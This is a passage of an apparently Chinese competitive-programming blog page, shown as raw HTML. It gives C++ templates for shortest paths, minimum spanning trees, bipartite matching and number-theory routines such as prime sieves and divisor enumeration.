class="line"></span><br><span class="line">    <span class="keyword">if</span> (dist[n] == <span class="number">0x3f3f3f3f</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> dist[n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>spfa判断负环</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> n;      <span class="comment">// 总点数</span></span><br><span class="line"><span class="type">int</span> h[N], w[N], e[N], ne[N], idx;       <span class="comment">// 邻接表存储所有边</span></span><br><span class="line"><span class="type">int</span> dist[N], cnt[N];        <span class="comment">// dist[x]存储1号点到x的最短距离，cnt[x]存储1到x的最短路中经过的点数</span></span><br><span class="line"><span class="type">bool</span> st[N];     <span class="comment">// 存储每个点是否在队列中</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果存在负环，则返回true，否则返回false。</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">spfa</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 不需要初始化dist数组</span></span><br><span class="line">    <span class="comment">// 原理：如果某条最短路径上有n个点（除了自己），那么加上自己之后一共有n+1个点，由抽屉原理一定有两个点相同，所以存在环。</span></span><br><span class="line"></span><br><span class="line">    queue&lt;<span class="type">int</span>&gt; q;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        q.<span class="built_in">push</span>(i);</span><br><span class="line">        st[i] = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (q.<span class="built_in">size</span>())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> t = q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line"></span><br><span class="line">        st[t] = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = h[t]; i != <span class="number">-1</span>; i = ne[i])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> j = e[i];</span><br><span class="line">            <span class="keyword">if</span> (dist[j] &gt; dist[t] + w[i])</span><br><span class="line">            &#123;</span><br><span class="line">                dist[j] = dist[t] + w[i];</span><br><span class="line">                cnt[j] = cnt[t] + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span> (cnt[j] &gt;= n) <span class="keyword">return</span> <span class="literal">true</span>;       <span class="comment">// 如果从1号点到x的最短路中包含至少n个点（不包括自己），则说明存在环</span></span><br><span class="line">                <span class="keyword">if</span> (!st[j])</span><br><span class="line">                &#123;</span><br><span class="line">                    q.<span class="built_in">push</span>(j);</span><br><span class="line">                    st[j] = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="floyd">floyd</h3><p>多源最短路 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>3</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^3)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">初始化：</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++ )</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j ++ )</span><br><span class="line">            <span class="keyword">if</span> (i == j) d[i][j] = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">else</span> d[i][j] = INF;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 算法结束后，d[a][b]表示a到b的最短距离</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">floyd</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">1</span>; k &lt;= n; k ++ )</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++ )</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j ++ )</span><br><span class="line">                d[i][j] = <span class="built_in">min</span>(d[i][j], d[i][k] + d[k][j]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="最小生成树">最小生成树</h3><p>顶点有权值时，建立虚拟顶点</p><p><strong>Kruskal</strong> <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>e</mi><mi>l</mi><mi>o</mi><mi>g</mi><mi>e</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(eloge)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">e</span><span class="mclose">)</span></span></span></span></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> n, m;       <span class="comment">// n是点数，m是边数</span></span><br><span class="line"><span class="type">int</span> p[N];       <span class="comment">// 并查集的父节点数组</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Edge</span>     <span class="comment">// 存储边</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a, b, w;</span><br><span class="line"></span><br><span class="line">    <span class="type">bool</span> <span class="keyword">operator</span>&lt; (<span class="type">const</span> Edge &amp;W)<span class="type">const</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> w &lt; W.w;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;edges[M];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span>     <span class="comment">// 并查集核心操作</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (p[x] != x) p[x] = <span class="built_in">find</span>(p[x]);</span><br><span class="line">    <span class="keyword">return</span> p[x];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">kruskal</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">sort</span>(edges, edges + m);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++ ) p[i] = i;    <span class="comment">// 初始化并查集</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> res = <span class="number">0</span>, cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> a = edges[i].a, b = edges[i].b, w = edges[i].w;</span><br><span class="line"></span><br><span class="line">        a = <span class="built_in">find</span>(a), b = <span class="built_in">find</span>(b);</span><br><span class="line">        <span class="keyword">if</span> (a != b)     <span class="comment">// 如果两个连通块不连通，则将这两个连通块合并</span></span><br><span class="line">        &#123;</span><br><span class="line">            p[a] = b;</span><br><span class="line">            res += w;</span><br><span class="line">            cnt ++ ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (cnt &lt; n - <span class="number">1</span>) <span class="keyword">return</span> INF;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>朴素版prim</strong> <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo>+</mo><mi>e</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^2+e)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">e</span><span class="mclose">)</span></span></span></span></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> n;      <span class="comment">// n表示点数</span></span><br><span class="line"><span class="type">int</span> g[N][N];        <span class="comment">// 邻接矩阵，存储所有边</span></span><br><span class="line"><span class="type">int</span> dist[N];        <span class="comment">// 存储其他点到当前最小生成树的距离</span></span><br><span class="line"><span class="type">bool</span> st[N];     <span class="comment">// 存储每个点是否已经在生成树中</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果图不连通，则返回INF(值是0x3f3f3f3f), 否则返回最小生成树的树边权重之和</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">prim</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(dist, <span class="number">0x3f</span>, <span class="keyword">sizeof</span> dist);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> t = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j ++ )</span><br><span class="line">            <span class="keyword">if</span> (!st[j] &amp;&amp; (t == <span class="number">-1</span> || dist[t] &gt; dist[j]))</span><br><span class="line">                t = j;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (i &amp;&amp; dist[t] == INF) <span class="keyword">return</span> INF;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (i) res += dist[t];</span><br><span class="line">        st[t] = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j ++ ) dist[j] = <span class="built_in">min</span>(dist[j], g[t][j]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="染色法判断是否为二分图">染色法判断是否为二分图</h3><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo>+</mo><mi>e</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n+e)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">e</span><span class="mclose">)</span></span></span></span></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> n;      <span class="comment">// n表示点数</span></span><br><span class="line"><span class="type">int</span> h[N], e[M], ne[M], idx;     <span class="comment">// 邻接表存储图</span></span><br><span class="line"><span class="type">int</span> color[N];       <span class="comment">// 表示每个点的颜色，-1表示未染色，0表示白色，1表示黑色</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 参数：u表示当前节点，c表示当前点的颜色</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> u, <span class="type">int</span> c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    color[u] = c;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = h[u]; i != <span class="number">-1</span>; i = ne[i])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> j = e[i];</span><br><span class="line">        <span class="keyword">if</span> (color[j] == <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">dfs</span>(j, !c)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (color[j] == c) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">check</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(color, <span class="number">-1</span>, <span class="keyword">sizeof</span> color);</span><br><span class="line">    <span class="type">bool</span> flag = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++ )</span><br><span class="line">        <span class="keyword">if</span> (color[i] == <span class="number">-1</span>)</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">dfs</span>(i, <span class="number">0</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                flag = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    <span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="求二分图的最大匹配-匈牙利算法">求二分图的最大匹配（匈牙利算法）</h3><p>二分图的匹配：给定一个二分图 <code>G</code>，在 <code>G</code> 的一个子图 <code>M</code> 中，<code>M</code> 的边集 <code>&#123;E&#125;</code>中的任意两条边都不依附于同一个顶点，则称 <code>M</code> 是一个匹配。</p><p>二分图的最大匹配：所有匹配中包含边数最多的一组匹配被称为二分图的最大匹配，其边数即为最大匹配数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> n1, n2;     <span class="comment">// n1表示第一个集合中的点数，n2表示第二个集合中的点数</span></span><br><span class="line"><span class="type">int</span> h[N], e[M], ne[M], idx;     <span class="comment">// 邻接表存储所有边，匈牙利算法中只会用到从第一个集合指向第二个集合的边，所以这里只用存一个方向的边</span></span><br><span class="line"><span class="type">int</span> match[N];       <span class="comment">// 存储第二个集合中的每个点当前匹配的第一个集合中的点是哪个</span></span><br><span class="line"><span class="type">bool</span> st[N];     <span class="comment">// 表示第二个集合中的每个点是否已经被遍历过</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = h[x]; i != <span class="number">-1</span>; i = ne[i])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> j = e[i];</span><br><span class="line">        <span class="keyword">if</span> (!st[j])</span><br><span class="line">        &#123;</span><br><span class="line">            st[j] = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">if</span> (match[j] == <span class="number">0</span> || <span class="built_in">find</span>(match[j]))</span><br><span class="line">            &#123;</span><br><span class="line">                match[j] = x;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 求最大匹配数，依次枚举第一个集合中的每个点能否匹配第二个集合中的点</span></span><br><span class="line"><span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n1; i ++ )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">memset</span>(st, <span class="literal">false</span>, <span class="keyword">sizeof</span> st);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">find</span>(i)) res ++ ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="数学知识">数学知识</h2><h3 id="试除法判定是否为质数">试除法判定是否为质数</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">is_prime</span><span class="params">(<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (x &lt; <span class="number">2</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= x / i; i ++ )</span><br><span class="line">        <span class="keyword">if</span> (x % i == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分解质因数">分解质因数</h3><p>按照从小到大的顺序输出其分解质因数后，每个质因数的底数和指数，每个底数和指数占一行。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">divide</span><span class="params">(<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= x / i; i ++ )</span><br><span class="line">        <span class="keyword">if</span> (x % i == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> s = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (x % i == <span class="number">0</span>) x /= i, s ++ ;</span><br><span class="line">            cout &lt;&lt; i &lt;&lt; <span class="string">&#x27; &#x27;</span> &lt;&lt; s &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">if</span> (x &gt; <span class="number">1</span>) cout &lt;&lt; x &lt;&lt; <span class="string">&#x27; &#x27;</span> &lt;&lt; <span class="number">1</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="筛质数">筛质数</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//埃氏筛法</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">get_primes1</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!st[i])&#123;</span><br><span class="line">            primes[cnt++]=i;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=i;j&lt;=n;j+=i) st[j]=<span class="literal">true</span>;<span class="comment">//可以用质数就把所有的合数都筛掉；</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//线性筛法</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">get_primes</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//外层从2~n迭代，因为这毕竟算的是1~n中质数的个数，而不是某个数是不是质数的判定</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!st[i]) primes[cnt++]=i;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;primes[j]&lt;=n/i;j++)&#123;<span class="comment">//primes[j]&lt;=n/i:变形一下得到——primes[j]*i&lt;=n,把大于n的合数都筛了就</span></span><br><span class="line">        <span class="comment">//没啥意义了</span></span><br><span class="line">            st[primes[j]*i]=<span class="literal">true</span>;<span class="comment">//用最小质因子去筛合数</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//1)当i%primes[j]!=0时,说明此时遍历到的primes[j]不是i的质因子，那么只可能是此时的primes[j]&lt;i的</span></span><br><span class="line">            <span class="comment">//最小质因子,所以primes[j]*i的最小质因子就是primes[j];</span></span><br><span class="line">            <span class="comment">//2)当有i%primes[j]==0时,说明i的最小质因子是primes[j],因此primes[j]*i的最小质因子也就应该是</span></span><br><span class="line">            <span class="comment">//prime[j]，之后接着用st[primes[j+1]*i]=true去筛合数时，就不是用最小质因子去更新了,因为i有最小</span></span><br><span class="line">            <span class="comment">//质因子primes[j]&lt;primes[j+1],此时的primes[j+1]不是primes[j+1]*i的最小质因子，此时就应该</span></span><br><span class="line">            <span class="comment">//退出循环，避免之后重复进行筛选。</span></span><br><span class="line">            <span class="keyword">if</span>(i%primes[j]==<span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="试除法求约数">试除法求约数</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">get_divisors</span><span class="params">(<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= x / i; i ++ )</span><br><span class="line">        <span class="keyword">if</span> (x % i == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            res.<span class="built_in">push_back</span>(i);</span><br><span class="line">            <span class="keyword">if</span> (i != x / i) res.<span class="built_in">push_back</span>(x / i); <span class="comment">//如果i是x的约数那么x/i也一定是</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="built_in">sort</span>(res.<span class="built_in">begin</span>(), res.<span class="built_in">end</span>());</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="约数个数and约数之和">约数个数and约数之和</h3><p><img src="https://s2.loli.net/2024/03/30/VR7pToutsDWAdHP.png" alt="image1"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 